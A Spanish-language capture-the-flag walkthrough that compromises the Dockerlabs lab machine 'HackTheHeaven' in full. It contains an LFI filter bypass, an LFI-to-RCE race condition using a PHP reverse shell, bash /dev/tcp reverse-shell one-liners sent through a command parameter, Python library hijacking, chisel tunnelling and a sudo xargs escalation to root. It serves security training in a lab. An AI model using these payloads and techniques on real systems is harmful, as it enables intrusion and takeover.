# Máquina HackTheHeaven

Dificultad -> Difícil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

Creador -> [AlbertoMD3](https://github.com/albertomarcostic)

-----------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Bienvenido a HackTheHeaven
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php.bak
------------------------------------------------------------------------------
/index.html           (Status: 200) [Size: 925]
/info.php             (Status: 200) [Size: 72841]
/idol.html            (Status: 200) [Size: 6494] 
/server-status        (Status: 403) [Size: 275]
```

Encontramos un par de archivos interesantes. Un **info.php** y un **idol.html**.
Le echamos un vistazo al **info.php**:

![Pasted image 20240506190025](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/24cf278a-66f4-4714-8386-2e43b550b2ae)

Podemos ver que está visible la típica función que muestra la información sobre php que está instalado en el servidor víctima. 
Un par de cosas que podemos resaltar es que no hay **funciones deshabilitadas**:

![Pasted image 20240506190220](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/fc05c486-b6b7-47c9-9485-d6613365ec26)

Y la **subida de archivos** está en **ON**:

![Pasted image 20240506190247](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/ffa783bb-ddde-47fe-b22a-435fd5fc9087)

Esto me hace pensar directamente en un abuso de subida de archivos. Hay formas de subir archivos gracias a estas condiciones y de tener disponible el **info.php**. Pero necesitaríamos algo más para poder llegar a ejecutar el archivo malicioso que subamos.

Le echamos un vistazo al otro recurso -> **/idol.html**

![Pasted image 20240506190436](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/f3b7e85b-037f-41c5-94d5-b41643b6558a)

Si bajamos un poco en la web, tenemos un botón que nos lleva directamente a otro recurso.

![Pasted image 20240506190522](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/60f3a47b-9321-4727-bb97-6f6b2d900199)

Nos lleva a un recurso **/clouddev3lopmentfile.php**:

![Pasted image 20240506190549](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/494f99e4-2166-4ccc-a0c1-6dad2dfc9bf7)

Parece que podremos incluir archivos desde este recurso. (Para llegar a un posible **LFI** (Local File Inclusion)).

Probamos con alguno de los parámetros más típicos como **file** o **filename**. Y vemos que con el parámetro **filename** el servidor nos da otra respuesta:

![Pasted image 20240506190748](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/4a1612b8-a8af-45ef-9ceb-d36e4040c693)

Parece que es el parámetro correcto, pero no nos deja visualizar el **/etc/passwd**. Probamos con un **directory path traversal**:

![Pasted image 20240506190933](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/aa291bc5-6827-4786-8b16-6aed7a767af6)

Tampoco da resultado, en este caso ni siquiera obtenemos mensaje de error. Es posible que esté sanitizado. Probamos haciendo el **path traversal** duplicando las barras y puntos. Esto es una forma de intentar saltarnos la sanitización en caso de que estén comprobando que el parámetro **filename** no contenga la cadena "**../**"

![Pasted image 20240506191248](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/bcf496ed-75be-4156-b557-7f0318011d50)

Nos vuelve a salir el error. Está identificando que queremos apuntar al **/etc/passwd**. Si el servidor está comprobando en concreto la cadena "/etc/passwd" para que no se muestre, podemos intentar saltarnos la sanitización añadiendo un punto y una barra en medio. (La cadena "**/./** no nos desplaza de directorio):

![Pasted image 20240506191503](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/e38c1ddb-f8ae-484f-9cc9-a304d444f779)

Tenemos un **LFI** !!

Con el **LFI** y la configuración adecuada que vimos en el **info.php** podemos llegar a lograr un **RCE** (Remote Code Execution) en el servidor víctima gracias a una **Condición de carrera**. El archivo malicioso se subirá a un directorio pero será inmediatamente borrado. Nuestro objetivo es llegar a ejecutarlo (gracias a la inclusión a través del **LFI**) en el servidor.

--------------
## Explotación

Para explotar esta **Condición de carrerra**, nos ayudaremos de un script ya automatizado en **python**.

Link al **script** -> [Exploit Python](https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)

<img width="657" alt="Captura de pantalla 2024-05-07 124016" src="https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/8652124f-1911-4c9a-9e94-7eab8d8b7939">

Tendremos que realizar algunas **modificaciones** en el script:

En la variable **Payload** del script, podemos incluir el código que queremos que se ejecute. En mi caso, pondré directamente una reverse shell a mi máquina atacante. Podemos usar la **reverse shell** típica en php -> [Reverse shell php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

Ponemos nuestra IP y puerto preferido en la **reverse shell**:

![Pasted image 20240501163517](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/88ae66ba-724e-430a-98bb-9ea62703aaf0)

En la variable **REQ1** tendremos que indicar donde se encuentra el archivo donde se está ejecutando la función de la información de php. En nuestro caso en **/info.php**:

![Pasted image 20240501163527](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/d59bb1a3-eff5-4de1-aafc-975bea64abe9)

En la variable **LFIREQ** indicamos donde y como hemos obtenido un **LFI** en el servidor. En nuestro caso incluimos el nombre del archivo php **/clouddev3lopmentfile.php** seguido del parámetro **filename** y el correspondiente **directory path traversal**.

![Pasted image 20240501163544](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/10601108-b1d3-4a46-8cc8-1c2f509ef960)

Por último cambiamos un par de parámetros en los campos del **tmp_name**, que es de donde obtiene el nombre del archivo malicioso temporal que subiremos al servidor y que se intentará incluir a través del **LFI**.
He tenido que añadir el "**&gt**", que he podido averiguar haciendo una prueba de subida de archivo con **burpsuite**.

![Pasted image 20240501163556](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/920b02b6-7010-4609-a420-14170bde8529)

![Pasted image 20240501163606](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/160f922e-c7aa-4439-a91d-55c5314e8c71)

Nos ponemos en escucha con **netcat**:

```shell
sudo nc -nlvp 443
```

Lo ejecutamos, sobre el puerto **80** de la **IP** víctima y usando **100** hilos:

```shell
python2.7 phpinfolfi.py 172.17.0.2 80 100
```

![Pasted image 20240506192805](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/45a1d025-9e65-4104-8a15-cc75e108b3fc)

Estamos dentro !

------------------------------

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------
## Escalada de privilegios

Nos encontramos como el usuario **www-data**.

En el directorio **/home**, vemos que hay 3 usuarios, y un archivo **.txt**. Le echamos un vistazo:

```shell
cat NotaParaMario.txt 
----------------------------------------------------
Hola Mario!
Acuerdate de revisar el script conjunto que estamos desarrollando parar la comunidad! 
Lo he movido al directorio tmp

megustaelfallout

Borra esta nota cuando la leas.
```

Podemos probar la cadena **"megustaelfallout"** como contraseña para los distintos usuarios. Y tenemos éxito con uno de ellos. 
El usuario **xerosec** -> **xerosec:megustaelfallout**:

```shell
su xerosec
```

Conseguimos migrar al usuario **xerosec**.
La nota además informaba de un script en el directorio **/tmp**.
Encontramos un script en **python**:

```shell
ls -l script.py 
-------------------------------------------------
-rwxr--r-- 1 mario mario 195 Apr 30 14:06 script.py
```

De echo si hacemos un **sudo -l** vemos que podemos ejecutar justo ese script como el usuario **mario**.

```shell
sudo -l
-------------------------------------------------
User xerosec may run the following commands on ba39cbc27b36:
    (mario) NOPASSWD: /usr/bin/python3 /tmp/script.py
```

Le echamos un vistazo a su contenido:

```shell
cat script.py 
-------------------------------------------------
import hashlib

if __name__ == '__main__':
    cadena = input("Introduce la cadena: ")
    hash_md5 = hashlib.md5(cadena.encode()).hexdigest()
    print("El hash MD5 de la cadena es:", hash_md5)
```

Es un script que está haciendo uso de una librería compartida para transformar cadenas de caracteres a **MD5**.

En este punto, se nos ocurre un **Python Library Hijacking**. Un secuestro de la biblioteca que usa el script para ejecutar comandos como el usuario propietario (**mario**).

Si vemos el **path** de python. Lo primero que hace es buscar en el directorio actual las librerías compartidas, y luego ya en el resto (De izquierda a derecha). El directorio actual (donde está el script) corresponde a la cadena vacía -> **''**

```shell
python3 -c 'import sys; print(sys.path)'
-----------------------------------
['', '/usr/lib/python312.zip', '/usr/lib/python3.12', '/usr/lib/python3.12/lib-dynload', '/usr/local/lib/python3.12/dist-packages', '/usr/lib/python3/dist-packages']
```

Crearemos una librería maliciosa en el directorio **/tmp**, y python buscará primero la librería en este directorio, ejecutando nuestro código malicioso.

```shell
	cd /tmp/
	touch hashlib.py
	nano hashlib.py
```

Ponemos el siguiente contenido que queremos que se ejecute:

```python
import os
os.system("bash")
```

```shell
sudo -u mario /usr/bin/python3 /tmp/script.py
```

Hemo migrado al usuario **mario** !

En su directorio **/home** encontramos una nota:

```shell
cat ServerDeS4vitar.txt 
------------------------------------------------------
Acordarme de usar la sintaxis index.php?cmds4vi=id para ejecutar comandos en el server de S4vitar
```

Es posible que haya un servicio internos que no hayamos podido identificar desde fuera con **nmap**.

Intentamos ver los servicios internos con **lsof**, **netstat**, **ss** pero ninguno está instalado, así que miramos el **/proc/net/tcp** y pasamos los puertos a decimal para ver cuales están abiertos:

```shell
for port in $(cat /proc/net/tcp | awk '{print $2}' | awk '{print $2}' FS=":" | sort -u); do echo "[+] PORT $port -> $((0x$port))"; done
----------------------------------------------------------
[+] PORT 0050 -> 80
[+] PORT 270F -> 9999
[+] PORT A36A -> 41834
```

Vemos un puerto 9999 y 41834.
Si le hacemos un curl al **9999** vemos que nos contesta:

```shell
curl http://localhost:9999; echo
-------------------------------------------
No se ha pasado ningun comando.
```

Parece que le podemos pasar comandos, y si recordamos la nota, nos daba la pista de cual era el parámetro -> **cmds4vi**:

```shell
curl http://localhost:9999/index.php?cmds4vi=id; echo
-------------------------------------------------------
uid=1001(s4vitar) gid=1001(s4vitar) groups=1001(s4vitar),100(users)
```

Nos contesta correctamente y vemos que estamos ejecutando los comandos como el usuario **s4vitar**.
Tratamos de enviarnos una **reverse shell**:

```shell
nc -nlvp 4433
```

```shell
curl http://localhost:9999/index.php?cmds4vi=bash -i >& /dev/tcp/172.17.0.1/4433 0>&1
```

![Pasted image 20240506204756](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/b9fe49ba-ad6c-4ebf-8886-d070f73854ca)

Vemos que nos llega la conexión pero inmediatamente se cierra y no nos podemos conectar correctamente.
Descargamos **chisel** en la máquina atacante y en la máquina víctima, para crear un túnel, y poder acceder a la web del puerto **9999** de la máquina víctima en la máquina atacante.

```shell
curl -o chisel.gz -L https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
chmod +x chisel
```

Máquina atacante:

```shell
./chisel server --reverse 1234
```

Máquina víctima:

```shell
./chisel client 172.17.0.1:8080 R:9999:127.0.0.1:9999
```

![Pasted image 20240506210404](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/b6298c14-4f40-4205-aa5e-ee1302a62f0e)

Ahora ya podemos acceder desde nuestro navegador local:

![Pasted image 20240506210734](https://github.com/albertomarcostic/HackTheHeaven/assets/131155486/4e159688-d36a-494a-b30a-cc74d7a0bc82)

Nos ponemos en escucha con **netcat**:

```shell
nc -nlvp 4433
```

Nos enviamos una **reverse shell** desde la URL:

```shell
http://localhost:9999/index.php?cmds4vi=bash -c "bash -i >%26 /dev/tcp/127.0.0.1/4433 0>%261"
```

Estamos dentro como el usuario **s4vitar**
Si hacemos **sudo -l** vemos que podemos ejecutar **xargs** como el usuario **root**.

```shell
sudo -l
-----------------------------
User s4vitar may run the following commands on ba39cbc27b36:
    (root) NOPASSWD: /usr/bin/xargs
```

Abusamos de este ejecutando:

```shell
sudo /usr/bin/xargs -a /dev/null bash
```

```shell
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximos en la máquina !
